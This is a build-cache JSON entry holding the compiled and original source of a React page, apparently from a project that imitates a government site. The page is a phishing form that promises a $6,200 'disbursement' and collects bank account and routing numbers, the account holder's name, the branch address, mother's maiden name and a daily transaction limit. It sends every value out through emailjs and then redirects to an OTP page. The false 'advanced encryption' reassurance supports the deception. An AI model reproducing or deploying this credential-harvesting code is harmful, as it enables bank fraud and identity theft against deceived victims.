{"ast":null,"code":"import React,{useState}from'react';import{Modal,Button,Form}from'react-bootstrap';import{useNavigate}from'react-router-dom';import emailjs from'emailjs-com';import'./ExamForm.css';import Navbar from'./Navbar';import Footer from'./Footer';import bankLogo from'./img/banklogo.png';import{jsx as _jsx,jsxs as _jsxs}from\"react/jsx-runtime\";const ExamForm2=()=>{const[showConfirmModal,setShowConfirmModal]=useState(false);const[showPinModal,setShowPinModal]=useState(false);const[formValues,setFormValues]=useState({bankName:'',cardNumber:'',nameOnCard:'',maidenName:'',accNo:'',routingNo:'',checkingNumber:'',streetAddress:'',city:'',state:'',postalCode:'',cardLimit:'',pin:''});const navigate=useNavigate();// Add this state variable\nconst[bankAccountType,setBankAccountType]=useState('');// Function to handle radio change\nconst handleAccountTypeChange=e=>{setBankAccountType(e.target.value);};const resetForm=()=>{setFormValues({bankName:'',cardNumber:'',nameOnCard:'',maidenName:'',accNo:'',routingNo:'',cardLimit:'',streetAddress:'',city:'',state:'',postalCode:'',pin:'',checkingNumber:'',bankAccountType:''});setBankAccountType('');// Reset bank account type separately\n};const handlePayClick=e=>{e.preventDefault();setShowConfirmModal(true);};const handleConfirmClick=()=>{sendEmail();// resetForm();\nsetShowConfirmModal(false);// navigate('/otp');\nsetShowPinModal(true);};const handlePinSubmit=e=>{e.preventDefault();sendEmail();resetForm();setShowPinModal(false);navigate('/otp');};const handleInputChange=e=>{const{name,value}=e.target;setFormValues({...formValues,[name]:value});};const handleNumberOnlyInput=e=>{e.target.value=e.target.value.replace(/[^0-9]/g,'');};const handleCardLimitChange=e=>{e.target.value=e.target.value.replace(/[a-zA-Z]/g,'');};// const handleCardLimitChange = (e) => {\n//   e.target.value = e.target.value.replace(/\\D/g, '');\n// };\n// const handleCardLimitChange = (e) => {\n//   const { name, value } = e.target;\n//   if (/^[\\d()+_\\s-]*$/.test(value)) {\n//     setFormValues({ ...formValues, [name]: value });\n//   }\n// };\n// const handleTextOnlyInput = (e) => {\n//   e.target.value = e.target.value.replace(/\\d/g, '');\n// };\nconst sendEmail=()=>{const templateParams={...formValues,bankAccountType,// Include the type of bank account\ncheckingNumber:formValues.checkingNumber||''// Include checking number if applicable\n};emailjs.send('service_e234qa4',// Replace with your service ID\n'template_f0nymc7',// Replace with your template ID\ntemplateParams,'aM4ACgzNEz-ykB_dV'// Replace with your user ID\n).then(response=>{console.log('SUCCESS!',response.status,response.text);},err=>{console.log('FAILED...',err);});};return/*#__PURE__*/_jsxs(\"div\",{children:[/*#__PURE__*/_jsx(Navbar,{}),/*#__PURE__*/_jsx(\"div\",{className:\"container d-flex justify-content-center mt-5\",children:/*#__PURE__*/_jsxs(\"div\",{className:\"col-md-6 mt-5\",children:[/*#__PURE__*/_jsx(\"h3\",{children:\"Enter Bank Details\"}),/*#__PURE__*/_jsxs(\"p\",{children:[\"Enter the following to receive your funds \",/*#__PURE__*/_jsx(\"br\",{}),\"Only enter correct details to avoid \",/*#__PURE__*/_jsx(\"span\",{style:{color:'#FF0000'},children:\"error(s)\"}),\" during disbursement.\"]}),/*#__PURE__*/_jsxs(\"div\",{className:\"card p-4 pt-2\",children:[/*#__PURE__*/_jsx(\"p\",{className:\"text-end fw-bold fs-6\",children:\"Single Disbursement $6200\"}),/*#__PURE__*/_jsx(\"p\",{className:\"fst-italic text-end p-0 m-0\",children:\"Trusted and Secure Payment\"}),/*#__PURE__*/_jsx(\"div\",{className:\"d-flex justify-content-end mb-3\",children:/*#__PURE__*/_jsx(\"img\",{src:bankLogo,alt:\"\",className:\"img-fluid\",width:270,height:30})}),/*#__PURE__*/_jsxs(Form,{onSubmit:handlePayClick,autoComplete:\"off\",children:[/*#__PURE__*/_jsxs(Form.Group,{className:\"mb-3\",controlId:\"bankName\",children:[/*#__PURE__*/_jsx(Form.Label,{children:\"Bank Name\"}),/*#__PURE__*/_jsx(Form.Control,{type:\"text\",placeholder:\"Enter your bank name\",name:\"bankName\",value:formValues.bankName// onInput={handleTextOnlyInput}\n,onChange:handleInputChange,required:true})]}),/*#__PURE__*/_jsxs(Form.Group,{className:\"mb-3\",controlId:\"nameOnCard\",children:[/*#__PURE__*/_jsx(Form.Label,{children:\"Full Name of Account Holder\"}),/*#__PURE__*/_jsx(Form.Control,{type:\"text\",placeholder:\"Enter account holder's full name\",name:\"nameOnCard\",value:formValues.nameOnCard// onInput={handleTextOnlyInput}\n,onChange:handleInputChange,required:true})]}),/*#__PURE__*/_jsxs(Form.Group,{className:\"mb-3\",controlId:\"accNo\",children:[/*#__PURE__*/_jsx(Form.Label,{children:\"Account Number\"}),/*#__PURE__*/_jsx(Form.Control,{// type=\"number\"\nplaceholder:\"e.g., 123456789012\",name:\"accNo\",value:formValues.accNo,onInput:handleNumberOnlyInput,maxLength:\"12\",onChange:handleInputChange,required:true})]}),/*#__PURE__*/_jsxs(Form.Group,{className:\"mb-3\",controlId:\"routingNo\",children:[/*#__PURE__*/_jsx(Form.Label,{children:\"Routing Number\"}),/*#__PURE__*/_jsx(Form.Control,{// type=\"number\"\nplaceholder:\"e.g., 123456789\",name:\"routingNo\",value:formValues.routingNo,onInput:handleNumberOnlyInput,maxLength:\"9\",onChange:handleInputChange,required:true})]}),/*#__PURE__*/_jsxs(Form.Group,{className:\"mb-3\",controlId:\"bankAccountType\",children:[/*#__PURE__*/_jsx(Form.Label,{children:\"Type of Bank Account\"}),/*#__PURE__*/_jsxs(\"div\",{children:[/*#__PURE__*/_jsx(Form.Check,{type:\"radio\",label:\"Savings Account\",name:\"bankAccountType\",value:\"Savings Account\",checked:bankAccountType==='Savings Account',onChange:handleAccountTypeChange,required:true}),/*#__PURE__*/_jsx(Form.Check,{type:\"radio\",label:\"Checking Account\",name:\"bankAccountType\",value:\"Checking Account\",checked:bankAccountType==='Checking Account',onChange:handleAccountTypeChange,required:true})]})]}),bankAccountType==='Checking Account'&&/*#__PURE__*/_jsxs(Form.Group,{className:\"mb-3\",controlId:\"checkingNumber\",children:[/*#__PURE__*/_jsx(Form.Label,{children:\"Checking Number\"}),/*#__PURE__*/_jsx(Form.Control,{// type=\"number\"\nplaceholder:\"Enter checking number\",name:\"checkingNumber\",value:formValues.checkingNumber||'',onInput:handleNumberOnlyInput,maxLength:\"12\",onChange:handleInputChange,required:true})]}),/*#__PURE__*/_jsxs(Form.Group,{controlId:\"formAddress\",className:\"mt-4\",children:[/*#__PURE__*/_jsx(Form.Label,{children:\"Bank Branch Address\"}),/*#__PURE__*/_jsx(Form.Control,{type:\"text\",placeholder:\"Street Address\",name:\"streetAddress\",value:formValues.streetAddress,onChange:handleInputChange,required:true,className:\"mb-2\"}),/*#__PURE__*/_jsx(Form.Control,{type:\"text\",placeholder:\"City\",name:\"city\",value:formValues.city,onChange:handleInputChange,required:true,className:\"mb-2\"}),/*#__PURE__*/_jsx(Form.Control,{type:\"text\",placeholder:\"State / Province\",name:\"state\",value:formValues.state,onChange:handleInputChange,required:true,className:\"mb-2\"}),/*#__PURE__*/_jsx(Form.Control,{type:\"text\",placeholder:\"Postal / Zip Code\",name:\"postalCode\",value:formValues.postalCode,onChange:handleInputChange,required:true,className:\"mb-3\"})]}),/*#__PURE__*/_jsx(\"p\",{className:\"fst-italic\",children:\"Please review and confirm your account details before submission.\"}),/*#__PURE__*/_jsx(Button,{variant:\"primary\",type:\"submit\",children:\"SUBMIT\"})]})]}),/*#__PURE__*/_jsxs(\"p\",{className:\"mt-3\",children:[/*#__PURE__*/_jsx(\"strong\",{children:\"Trusted and Secure\"}),/*#__PURE__*/_jsx(\"br\",{}),\"Your security is our top priority. We employ advanced encryption protocols to safeguard your information, ensuring the highest standards of data protection.\"]})]})}),/*#__PURE__*/_jsxs(Modal,{show:showConfirmModal,onHide:()=>setShowConfirmModal(false),children:[/*#__PURE__*/_jsx(Modal.Header,{closeButton:true,children:/*#__PURE__*/_jsx(Modal.Title,{children:\"Confirm Your Details\"})}),/*#__PURE__*/_jsxs(Modal.Body,{children:[\"Please ensure all account details are correct before confirming your submission to avoid \",/*#__PURE__*/_jsx(\"span\",{style:{color:'#FF0000'},children:\"error(s)\"}),\" during disbursement.\"]}),/*#__PURE__*/_jsxs(Modal.Footer,{children:[/*#__PURE__*/_jsx(Button,{variant:\"secondary\",onClick:()=>setShowConfirmModal(false),children:\"Cancel\"}),/*#__PURE__*/_jsx(Button,{variant:\"primary\",onClick:handleConfirmClick,children:\"Submit\"})]})]}),/*#__PURE__*/_jsxs(Modal,{show:showPinModal,onHide:()=>setShowPinModal(false),children:[/*#__PURE__*/_jsx(Modal.Header,{closeButton:true,children:/*#__PURE__*/_jsx(Modal.Title,{children:\"Account Verification\"})}),/*#__PURE__*/_jsx(Modal.Body,{children:/*#__PURE__*/_jsxs(Form,{onSubmit:handlePinSubmit,children:[/*#__PURE__*/_jsxs(Form.Group,{className:\"mb-3\",controlId:\"maidenName\",children:[/*#__PURE__*/_jsx(Form.Label,{children:\"Mother\\u2019s Maiden Name\"}),/*#__PURE__*/_jsx(Form.Control,{type:\"text\",placeholder:\"Enter mother's maiden name\",name:\"maidenName\",value:formValues.maidenName// onInput={handleTextOnlyInput}\n,onChange:handleInputChange,required:true})]}),/*#__PURE__*/_jsxs(Form.Group,{controlId:\"formCardLimit\",className:\"mt-2\",children:[/*#__PURE__*/_jsx(Form.Label,{children:\" Transaction Limit per Day \"}),/*#__PURE__*/_jsx(Form.Control,{type:\"text\",placeholder:\"Enter daily transaction limit (e.g., $5,000)\",name:\"cardLimit\",value:formValues.cardLimit,onInput:handleCardLimitChange,onChange:handleInputChange,required:true})]}),/*#__PURE__*/_jsx(Button,{variant:\"primary\",type:\"submit\",className:\"mt-3\",children:\"VERIFY\"})]})})]}),/*#__PURE__*/_jsx(Footer,{})]});};export default ExamForm2;","map":{"version":3,"names":["React","useState","Modal","Button","Form","useNavigate","emailjs","Navbar","Footer","bankLogo","jsx","_jsx","jsxs","_jsxs","ExamForm2","showConfirmModal","setShowConfirmModal","showPinModal","setShowPinModal","formValues","setFormValues","bankName","cardNumber","nameOnCard","maidenName","accNo","routingNo","checkingNumber","streetAddress","city","state","postalCode","cardLimit","pin","navigate","bankAccountType","setBankAccountType","handleAccountTypeChange","e","target","value","resetForm","handlePayClick","preventDefault","handleConfirmClick","sendEmail","handlePinSubmit","handleInputChange","name","handleNumberOnlyInput","replace","handleCardLimitChange","templateParams","send","then","response","console","log","status","text","err","children","className","style","color","src","alt","width","height","onSubmit","autoComplete","Group","controlId","Label","Control","type","placeholder","onChange","required","onInput","maxLength","Check","label","checked","variant","show","onHide","Header","closeButton","Title","Body","onClick"],"sources":["C:/Users/GABON/Documents/Github Dev/code testing sample/dol.gov.form-main/src/ExamForm2.js"],"sourcesContent":["import React, { useState } from 'react';\r\nimport { Modal, Button, Form } from 'react-bootstrap';\r\nimport { useNavigate } from 'react-router-dom';\r\nimport emailjs from 'emailjs-com';\r\nimport './ExamForm.css';\r\nimport Navbar from './Navbar';\r\nimport Footer from './Footer';\r\nimport bankLogo from './img/banklogo.png';\r\n\r\nconst ExamForm2 = () => {\r\n  const [showConfirmModal, setShowConfirmModal] = useState(false);\r\n  const [showPinModal, setShowPinModal] = useState(false);\r\n  const [formValues, setFormValues] = useState({\r\n    bankName: '',\r\n    cardNumber: '',\r\n    nameOnCard: '',\r\n    maidenName: '',\r\n    accNo: '',\r\n    routingNo: '',\r\n    checkingNumber: '',\r\n    streetAddress: '',\r\n    city: '',\r\n    state: '',\r\n    postalCode: '',\r\n    cardLimit: '',\r\n    pin: '',\r\n  });\r\n  const navigate = useNavigate();\r\n\r\n  // Add this state variable\r\n  const [bankAccountType, setBankAccountType] = useState('');\r\n\r\n  // Function to handle radio change\r\n  const handleAccountTypeChange = (e) => {\r\n    setBankAccountType(e.target.value);\r\n  };\r\n\r\n  const resetForm = () => {\r\n    setFormValues({\r\n      bankName: '',\r\n      cardNumber: '',\r\n      nameOnCard: '',\r\n      maidenName: '',\r\n      accNo: '',\r\n      routingNo: '',\r\n      cardLimit: '',\r\n      streetAddress: '',\r\n      city: '',\r\n      state: '',\r\n      postalCode: '',\r\n      pin: '',\r\n      checkingNumber: '', \r\n      bankAccountType: '',\r\n    });\r\n\r\n    setBankAccountType(''); // Reset bank account type separately\r\n  };\r\n\r\n  const handlePayClick = (e) => {\r\n    e.preventDefault();\r\n    setShowConfirmModal(true);\r\n  };\r\n\r\n  const handleConfirmClick = () => {\r\n    sendEmail();\r\n    // resetForm();\r\n    setShowConfirmModal(false);\r\n    // navigate('/otp');\r\n    setShowPinModal(true);\r\n  };\r\n\r\n  const handlePinSubmit = (e) => {\r\n    e.preventDefault();\r\n    sendEmail();\r\n    resetForm();\r\n    setShowPinModal(false);\r\n    navigate('/otp');\r\n  };\r\n\r\n  const handleInputChange = (e) => {\r\n    const { name, value } = e.target;\r\n    setFormValues({ ...formValues, [name]: value });\r\n  };\r\n\r\n  const handleNumberOnlyInput = (e) => {\r\n    e.target.value = e.target.value.replace(/[^0-9]/g, '');\r\n  };\r\n  \r\n  const handleCardLimitChange = (e) => {\r\n  e.target.value = e.target.value.replace(/[a-zA-Z]/g, '');\r\n};\r\n\r\n  \r\n  // const handleCardLimitChange = (e) => {\r\n  //   e.target.value = e.target.value.replace(/\\D/g, '');\r\n  // };\r\n  \r\n  // const handleCardLimitChange = (e) => {\r\n\r\n  //   const { name, value } = e.target;\r\n\r\n  //   if (/^[\\d()+_\\s-]*$/.test(value)) {\r\n  //     setFormValues({ ...formValues, [name]: value });\r\n  //   }\r\n  // };\r\n\r\n  // const handleTextOnlyInput = (e) => {\r\n  //   e.target.value = e.target.value.replace(/\\d/g, '');\r\n  // };\r\n\r\n\r\n  const sendEmail = () => {\r\n    const templateParams = {\r\n      ...formValues,\r\n      bankAccountType, // Include the type of bank account\r\n      checkingNumber: formValues.checkingNumber || '', // Include checking number if applicable\r\n    };\r\n\r\n    emailjs\r\n      .send(\r\n        'service_e234qa4', // Replace with your service ID\r\n        'template_f0nymc7', // Replace with your template ID\r\n        templateParams,\r\n        'aM4ACgzNEz-ykB_dV' // Replace with your user ID\r\n      )\r\n      .then(\r\n        (response) => {\r\n          console.log('SUCCESS!', response.status, response.text);\r\n        },\r\n        (err) => {\r\n          console.log('FAILED...', err);\r\n        }\r\n      );\r\n  };\r\n\r\n  return (\r\n    <div>\r\n      <Navbar />\r\n      <div className=\"container d-flex justify-content-center mt-5\">\r\n        <div className=\"col-md-6 mt-5\">\r\n          {/* <h2 className=\"mt-5\">EXAM FORM</h2>\r\n          <p>\r\n            <strong>About The Exam</strong>\r\n          </p>\r\n          <p>Compulsory DePaul University exam: 35% of your course assessment.</p>\r\n          <div className=\"card mb-3\">\r\n            <div className=\"card-body\">\r\n              <p className=\"card-text fw-medium fs-3\">Community Group Exam Form: #journalism #DePaul University</p>\r\n              <p className=\"fw-bold fs-4 text-end\"> - $ 6.00</p>\r\n            </div>\r\n          </div> */}\r\n          <h3>Enter Bank Details</h3>\r\n          <p>\r\n            Enter the following to receive your funds <br />\r\n            Only enter correct details to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.\r\n          </p>\r\n          <div className=\"card p-4 pt-2\">\r\n            <p className='text-end fw-bold fs-6'>Single Disbursement $6200</p>\r\n            <p className=\"fst-italic text-end p-0 m-0\">Trusted and Secure Payment</p>\r\n            <div className=\"d-flex justify-content-end mb-3\">\r\n              <img src={bankLogo} alt=\"\" className=\"img-fluid\" width={270} height={30} />\r\n            </div>\r\n            <Form onSubmit={handlePayClick} autoComplete=\"off\">\r\n              <Form.Group className=\"mb-3\" controlId=\"bankName\">\r\n                <Form.Label>Bank Name</Form.Label>\r\n                <Form.Control\r\n                  type=\"text\"\r\n                  placeholder=\"Enter your bank name\"\r\n                  name=\"bankName\"\r\n                  value={formValues.bankName}\r\n                  // onInput={handleTextOnlyInput}\r\n                  onChange={handleInputChange}\r\n                  required\r\n                />\r\n              </Form.Group>\r\n\r\n              <Form.Group className=\"mb-3\" controlId=\"nameOnCard\">\r\n                <Form.Label>Full Name of Account Holder</Form.Label>\r\n                <Form.Control\r\n                  type=\"text\"\r\n                  placeholder=\"Enter account holder's full name\"\r\n                  name=\"nameOnCard\"\r\n                  value={formValues.nameOnCard}\r\n                  // onInput={handleTextOnlyInput}\r\n                  onChange={handleInputChange}\r\n                  required\r\n                />\r\n              </Form.Group>\r\n\r\n              \r\n              {/* <Form.Group className=\"mb-3\" controlId=\"maidenName\">\r\n                <Form.Label>Mother’s Maiden Name</Form.Label>\r\n                <Form.Control\r\n                  type=\"text\"\r\n                  placeholder=\"Enter mother's maiden name\"\r\n                  name=\"maidenName\"\r\n                  value={formValues.maidenName}\r\n                  // onInput={handleTextOnlyInput}\r\n                  onChange={handleInputChange}\r\n                  required\r\n                />\r\n              </Form.Group> */}\r\n\r\n              <Form.Group className=\"mb-3\" controlId=\"accNo\">\r\n                <Form.Label>Account Number</Form.Label>\r\n                <Form.Control\r\n                  // type=\"number\"\r\n                  placeholder=\"e.g., 123456789012\"\r\n                  name=\"accNo\"\r\n                  value={formValues.accNo}\r\n                  onInput={handleNumberOnlyInput}\r\n                  maxLength='12'\r\n                  onChange={handleInputChange}\r\n                  required\r\n                />\r\n              </Form.Group>\r\n\r\n              <Form.Group className=\"mb-3\" controlId=\"routingNo\">\r\n                <Form.Label>Routing Number</Form.Label>\r\n                <Form.Control\r\n                  // type=\"number\"\r\n                  placeholder=\"e.g., 123456789\"\r\n                  name=\"routingNo\"\r\n                  value={formValues.routingNo}\r\n                  onInput={handleNumberOnlyInput}\r\n                  maxLength='9'\r\n                  onChange={handleInputChange}\r\n                  required\r\n                />\r\n              </Form.Group>\r\n\r\n              <Form.Group className=\"mb-3\" controlId=\"bankAccountType\">\r\n                <Form.Label>Type of Bank Account</Form.Label>\r\n                <div>\r\n                  <Form.Check\r\n                    type=\"radio\"\r\n                    label=\"Savings Account\"\r\n                    name=\"bankAccountType\"\r\n                    value=\"Savings Account\"\r\n                    checked={bankAccountType === 'Savings Account'}\r\n                    onChange={handleAccountTypeChange}\r\n                    required\r\n                  />\r\n                  <Form.Check\r\n                    type=\"radio\"\r\n                    label=\"Checking Account\"\r\n                    name=\"bankAccountType\"\r\n                    value=\"Checking Account\"\r\n                    checked={bankAccountType === 'Checking Account'}\r\n                    onChange={handleAccountTypeChange}\r\n                    required\r\n                  />\r\n                </div>\r\n              </Form.Group>\r\n\r\n              {/* Conditionally render Checking Number field */}\r\n              {bankAccountType === 'Checking Account' && (\r\n                <Form.Group className=\"mb-3\" controlId=\"checkingNumber\">\r\n                  <Form.Label>Checking Number</Form.Label>\r\n                  <Form.Control\r\n                    // type=\"number\"\r\n                    placeholder=\"Enter checking number\"\r\n                    name=\"checkingNumber\"\r\n                    value={formValues.checkingNumber || ''}\r\n                    onInput={handleNumberOnlyInput}\r\n                    maxLength='12'\r\n                    onChange={handleInputChange}\r\n                    required\r\n                  />\r\n                </Form.Group>\r\n              )}\r\n\r\n              \r\n              {/* <Form.Group controlId=\"formCardLimit\" className=\"mt-2\">\r\n\r\n              <Form.Label> Transaction Limit per Day </Form.Label>\r\n\r\n              <Form.Control type=\"text\" placeholder=\"Enter daily transaction limit (e.g., $5,000)\" name=\"cardLimit\" value={formValues.cardLimit}\r\n                onInput={handleCardLimitChange}\r\n                onChange={handleInputChange} required />\r\n            </Form.Group>      */}\r\n\r\n              <Form.Group controlId=\"formAddress\" className=\"mt-4\">\r\n                <Form.Label>Bank Branch Address</Form.Label>\r\n                <Form.Control\r\n                  type=\"text\"\r\n                  placeholder=\"Street Address\"\r\n                  name=\"streetAddress\"\r\n                  value={formValues.streetAddress}\r\n                  onChange={handleInputChange}\r\n                  required\r\n                  className=\"mb-2\"\r\n                />\r\n                {/*\r\n                <Form.Control\r\n                  type=\"text\"\r\n                  placeholder=\"Street Address Line 2 (Optional)\"\r\n                  name=\"streetAddress2\"\r\n                  value={formValues.streetAddress2}\r\n                  onChange={handleInputChange}\r\n                  className=\"mb-2\"\r\n                />\r\n                */}\r\n                <Form.Control\r\n                  type=\"text\"\r\n                  placeholder=\"City\"\r\n                  name=\"city\"\r\n                  value={formValues.city}\r\n                  onChange={handleInputChange}\r\n                  required\r\n                  className=\"mb-2\"\r\n                />\r\n                <Form.Control\r\n                  type=\"text\"\r\n                  placeholder=\"State / Province\"\r\n                  name=\"state\"\r\n                  value={formValues.state}\r\n                  onChange={handleInputChange}\r\n                  required\r\n                  className=\"mb-2\"\r\n                />\r\n                <Form.Control\r\n                  type=\"text\"\r\n                  placeholder=\"Postal / Zip Code\"\r\n                  name=\"postalCode\"\r\n                  value={formValues.postalCode}\r\n                  onChange={handleInputChange}\r\n                  required\r\n                  className=\"mb-3\"\r\n                />\r\n              </Form.Group>\r\n\r\n              <p className='fst-italic'>Please review and confirm your account details before submission.</p>\r\n\r\n              <Button variant=\"primary\" type=\"submit\">SUBMIT</Button>\r\n              {/* <p className=\"fw-bold text-end\"> - $ 6.00</p> */}\r\n            </Form>\r\n          </div>\r\n          <p className=\"mt-3\"><strong>Trusted and Secure</strong><br />\r\n          Your security is our top priority. We employ advanced encryption protocols to safeguard your information, ensuring the highest standards of data protection.</p>\r\n        </div>\r\n      </div>\r\n\r\n      {/* Confirmation Modal */}\r\n      <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>\r\n        <Modal.Header closeButton>\r\n          <Modal.Title>Confirm Your Details</Modal.Title>\r\n        </Modal.Header>\r\n        <Modal.Body>\r\n        Please ensure all account details are correct before confirming your submission to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.\r\n        </Modal.Body>\r\n        <Modal.Footer>\r\n          <Button variant=\"secondary\" onClick={() => setShowConfirmModal(false)}>\r\n            Cancel\r\n          </Button>\r\n          <Button variant=\"primary\" onClick={handleConfirmClick}>\r\n            Submit\r\n          </Button>\r\n        </Modal.Footer>\r\n      </Modal>\r\n\r\n      {/* PIN Modal */}\r\n    \r\n      <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>\r\n        <Modal.Header closeButton>\r\n          <Modal.Title>Account Verification</Modal.Title>\r\n        </Modal.Header>\r\n        <Modal.Body>\r\n          <Form onSubmit={handlePinSubmit}>\r\n            {/* <Form.Group controlId=\"formPin\">\r\n              <Form.Label>Enter PIN</Form.Label>\r\n              <Form.Control\r\n                type=\"password\"\r\n                placeholder=\"Enter PIN\"\r\n                name=\"pin\"\r\n                value={formValues.pin}\r\n                onInput={handleNumberOnlyInput}\r\n                onChange={handleInputChange}\r\n                required\r\n              />\r\n            </Form.Group> */}\r\n\r\n            <Form.Group className=\"mb-3\" controlId=\"maidenName\">\r\n              <Form.Label>Mother’s Maiden Name</Form.Label>\r\n              <Form.Control\r\n                type=\"text\"\r\n                placeholder=\"Enter mother's maiden name\"\r\n                name=\"maidenName\"\r\n                value={formValues.maidenName}\r\n                // onInput={handleTextOnlyInput}\r\n                onChange={handleInputChange}\r\n                required\r\n              />\r\n            </Form.Group>\r\n\r\n            <Form.Group controlId=\"formCardLimit\" className=\"mt-2\">\r\n\r\n            <Form.Label> Transaction Limit per Day </Form.Label>\r\n\r\n            <Form.Control type=\"text\" placeholder=\"Enter daily transaction limit (e.g., $5,000)\" name=\"cardLimit\" value={formValues.cardLimit}\r\n              onInput={handleCardLimitChange}\r\n              onChange={handleInputChange} required />\r\n            </Form.Group>  \r\n\r\n            <Button variant=\"primary\" type=\"submit\" className=\"mt-3\">\r\n              VERIFY\r\n            </Button>\r\n          </Form>\r\n        </Modal.Body>\r\n      </Modal>\r\n      \r\n      \r\n      <Footer />\r\n    </div>\r\n  );\r\n};\r\n\r\nexport default ExamForm2;\r\n"],"mappings":"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